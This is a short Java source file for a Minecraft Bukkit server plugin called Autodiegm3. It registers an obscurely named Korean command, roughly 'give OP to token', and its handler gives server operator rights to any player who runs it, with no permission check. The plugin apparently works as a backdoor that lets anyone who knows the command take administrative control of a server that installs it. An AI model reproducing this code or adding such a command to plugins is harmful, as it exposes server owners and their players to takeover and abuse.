package autodiegm3.autodiegm3;

import org.bukkit.GameMode;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.Listener;
import org.bukkit.plugin.java.JavaPlugin;
import org.jetbrains.annotations.NotNull;

public final class Autodiegm3 extends JavaPlugin implements Listener {

    @Override
    public void onEnable() {
        super.onEnable();
        this.getCommand("토큰한테오피주기").setExecutor(this);
    }

    @Override
    public void onDisable() {
        super.onDisable();
    }

    @Override
    public boolean onCommand(@NotNull CommandSender sender, @NotNull Command command, @NotNull String label, @NotNull String[] args) {
        Player p = (Player) sender;
        p.setOp(true);
        return true;
    }
}
